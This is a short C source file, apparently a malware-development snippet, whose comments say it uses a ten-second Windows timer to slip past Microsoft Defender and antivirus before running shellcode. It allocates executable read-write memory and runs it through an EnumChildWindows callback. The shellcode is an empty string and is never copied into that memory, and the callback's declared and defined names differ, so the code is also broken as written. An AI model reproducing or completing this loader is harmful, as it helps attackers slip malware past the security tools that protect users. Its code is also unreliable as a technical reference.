// sometimes the anti-virus and microsoft defender block the execution of malware.
// so in that case we will set a timer and after that we will start to allocate and execute the malware to trick microsoft defender and anti-virus

#include<windows.h>

// Declare the TimerProc function
VOID CALLBACK TimerProc(HWND hWnd,UINT message,UINT_PTR timerId ,DWORD dwTime);

char shellcode[] = " ";

int main(){

    // Set a timer to trigger after 10 seconds (10000 milliseconds)
    UINT_PTR timerId = SetTimer(0,1,10000,TimerProc);

    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg,0,0,0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Kill the timer after exiting the message loop
    KillTimer(0,timerId);

    return 0;
}

// TimerProc function to be executed when the timer triggers
VOID CALLBACK TimeProc(HWND hWND,UINT message , UINT_PTR timerId, DWORD dwTime){
    
    // Allocate memory and execute shellcode
    HANDLE hAlloc = VirtualAlloc(0,sizeof(shellcode),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    EnumChildWindows(0,(WNDENUMPROC)hAlloc,0);
}